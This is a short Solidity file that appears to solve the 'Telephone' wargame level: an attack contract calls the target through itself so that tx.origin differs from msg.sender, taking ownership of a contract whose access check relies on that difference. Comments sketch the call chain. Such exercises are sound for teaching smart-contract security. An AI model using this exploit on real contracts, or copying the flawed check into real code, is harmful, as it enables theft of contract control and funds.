// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract hack{
    constructor(address _target){
        Telephone(_target).changeOwner(msg.sender);

    }

}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }
//alice -->           contractA(hack)-->       contract B(telephone)
// txt.orgin        txt.orgin = alice    txt.orgin= alice 
//                  msg.sender = alice   msg.sender= A
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}